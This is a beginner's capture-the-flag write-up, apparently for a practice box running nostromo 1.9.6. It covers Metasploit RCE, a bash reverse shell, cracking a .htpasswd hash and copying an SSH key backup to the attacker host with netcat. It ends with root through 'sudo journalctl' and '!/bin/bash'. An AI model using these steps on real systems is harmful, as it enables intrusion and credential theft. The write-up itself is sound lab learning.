# First steps

As usual Got my nmap running 

![image](https://user-images.githubusercontent.com/84482765/126080080-b9f14ed0-6864-456a-b119-980ef1d8b71f.png)

![image](https://user-images.githubusercontent.com/84482765/126080087-9fa8f445-ceca-42a4-af92-73b0b3873b27.png)

I noticed port 80 so went over to my browser to check the website, but nothing unusual there i saw. 

While i check the website i run dirb, dirbuster, nikto and rapidscan to get some more info. But again, nothing interesting in the website. 
I tried messing with the contact information areas to see if XSS was possible but it was disabled.

Looked back at the nmap result and saw the HTTP header as "nostromo 1.9.6" so i used searchsploit to see if there was anything already there. And there was one found vulnerability.
The vulnerability is for RCE. So i run my msfconsole and set up the options for this vulnerability.

It worked. now i can use RCE so now i need a reverse shell. 
To make it easier for me i wanted to test this website i found: "https://www.revshells.com/"
With it it makes way simpler to test multiple codes for the reverse shell. 
using the "bash -i" code with my info, i set up netcat listener and pop the code over metasploit. 

![image](https://user-images.githubusercontent.com/84482765/126080443-3f6c2808-96bb-47e3-9ed1-a0ae14bca2e8.png)

I start poking around and looking trough the folders. Found user called "David" but since i'm "www-data" so i need some sort of privilege excalation to get David.

I use a tool called "linpeas" to get more info about the system and a way to priv esc.
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Using the "without curl" method, since in that reverse shell i can't use curl, i upload the linpeas.sh file to the server and run it. 

Among the HUGE amount of information that this script show me i found a particular file interesting.

![image](https://user-images.githubusercontent.com/84482765/126080605-283b02c3-1fa0-4ac5-b7d1-8634758407a2.png)


At this point i just want to say a quick FYI. I'm making these write ups mostly to help myself learn and try to understand what i did. I don't put here all the research i do, because most of the time is just a dead end.
I just assume one thing to be what i think it is and move on. If it is not what I tought it was just go back to first step, research and try something diferent.

Moving on...

I assume this is probably a way to use SSH to enter as this user. So i try to decode this hash and get the password.
My first try was with "HASHCAT". But after a few hours trying to get it to work because, what i presume to be, a hardware incompability and/or missing "watchdog" program to monitor my hardware.

So i try with "john the ripper" and it was done way faster than i thought. 

![image](https://user-images.githubusercontent.com/84482765/126080833-780065d5-50dd-4f88-a99d-f575a810b050.png)

From what i found about this .htpasswd, it stores apache credentials. So i tested "hydra" to make sure i got it right.

![image](https://user-images.githubusercontent.com/84482765/126082316-959d3d31-ff5f-48ed-a5ac-51db8b25cbdc.png)

I assume i could use it to connect via SSH but that was a dead end.
At this point i spent another couple of hours trying to do something with what i found, with no success. I found the user flag for this box accidentally.
I imagine that somebody else left some files in the tmp folder and inside one of these files, among other information, was the user.txt file. So yeah... 
I got the user flag. But i'm not satisfied with that. So i keep going.

Not gonna lie, i got stuck pretty bad here.

I whent back to tho that linpeas result. Back to that place where i found the .htpasswd file. I saw it was inside /var/nostromo/conf. So i move tho this folder to check things out.

![image](https://user-images.githubusercontent.com/84482765/126085386-b4c0ccc0-0e65-444f-b0aa-cdc4856d21b7.png)

this file "nhttpd.conf" looks interesting


![image](https://user-images.githubusercontent.com/84482765/126085406-a5fb096a-cfba-483e-a44a-21fbbf684ea5.png)

Expecially that final part. 
"HOMEDIRS"

since i know the user is david i try going to that folder :"/home/david/public_www". which surprisingly have read permission for me. Even though it is inside "david" user.

![image](https://user-images.githubusercontent.com/84482765/126085509-df736cad-d63d-489d-b9dd-cb0726002129.png)

Funny enough the file .htaccess is just david telling me to KEEP OUT. So i think i'm in the right path ahahaha
Also inside this folder there is a file called "backup-ssh-identity-files.tgz" so i try getting this file to see what is inside 
I set up a listener using on my machine

     nc -lnvp 443 > backup-identity-files.tgz.b64

and on the server

    cat backup-ssh-identity-files.tgz | nc 10.10.14.65 443 

After uncompressing the file using

    tar -zxvf backup-ssh-identity-files.tgz  
    
it had a few files inside /home/david/.ssh

![image](https://user-images.githubusercontent.com/84482765/126085910-22dc3a06-53bf-4d56-9803-6d0b1e5c8afc.png)


I tried using "john" again to decode the RSA key.

![image](https://user-images.githubusercontent.com/84482765/126086412-e28b2c9f-4b9d-47ea-8f35-d479bd21bce3.png)

But i dont think i really had to do it. Because i can just connect via SSH using this RSA file.

![image](https://user-images.githubusercontent.com/84482765/126086488-eafef4ba-e130-4789-aeb0-7858e0f18c63.png)

It asked for a password, but i think i just setting up my own. but just in case i used the same password i found from "john"

And there it was. Loged in as david! FINALLY! it took me way to long to find it haahahah. But i guess thats how it is in the beginning.

So there it is. Now i have the user flag legitimately

![image](https://user-images.githubusercontent.com/84482765/126086583-9496532c-1777-43e8-a097-f2a91cf95104.png)


# Root Flag

ok... now for the root flag.


OMFG how i overcomplicate stuff. The past hour or so i've been just going around in circles even though basically the FIRST thing i found was the way to go.
So let me start from the beggining.

The first thing i do is use 
 
    sudo -l
    
With it i may be able to see some commands i can try to exploit to get root console. 
But it ask for david password. I use both passwords i found so far (.htpasswd and id_rsa), but both don't work. so i need to find a work around.

I run linpeas again. I still have the .sh file from before, so i just run it again, but now as david. so i might get better stuff.
Right at the beggining of the linpeas report i have this:

![image](https://user-images.githubusercontent.com/84482765/126091225-a0c23517-857a-48df-b444-60c2bed75045.png)

So there is something interesting in this folder.

Going there i see a few files, but the interesting one is called "server-stats.sh"
Runing this file i get this:

![image](https://user-images.githubusercontent.com/84482765/126091376-78d528aa-b990-4a1b-a0a9-dd11bb11d6f9.png)

But by reading the content of the file itself i see something interesting.

![image](https://user-images.githubusercontent.com/84482765/126091444-a51b9c82-9475-4d0b-8b08-e64ac131d556.png)

The script calls for sudo and the command "journalctl". But when i ran this code it didn't ask me for any password. So i guess David is listed in sudoers for this command.

At this stage i experimented a bit and went another rabbit hole that made me go far from what i needed to do.
since i know the command i looked into GTFObins for it and the only thing there for this command was

    journalcrl
    !/bin/bash

so it is pretty simple.
I did a few mistakes. Tried changing the script and runing it again but didn't quite work. 

Eventually i did what i needed to do, which was copying the entire code before the pipe and runing it.

    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
    
this basically showed me the results from the script. BUT it didn't just end there, i could still write. So i wrote what i saw in the GTFObins website "!/bin/bash"

And that was it... It spawned root console for me.

![image](https://user-images.githubusercontent.com/84482765/126092040-69f3b466-fe74-466d-833f-9cb6212cd940.png)





# Conclusion

Overall box was pretty simple. Even though took me the entire day to do it. I spend too much researching and finding interesting posts, news, documents, exploits and stuff.
But thanks to this box i was able to explore LINPEAS a little more and test diferent ways to file transfer between my machine and the server machine. 
I did strugle if this kind of stuff before. But now i know a few diferent ways to do it. Using SSH, netcat, python simpleserver, wget and curl. 
I also found other scripts that did similar things to linpeas and tried a couple of them on this box. I recomend checking out: https://www.hackingarticles.in/linux-privilege-escalation-automated-script/













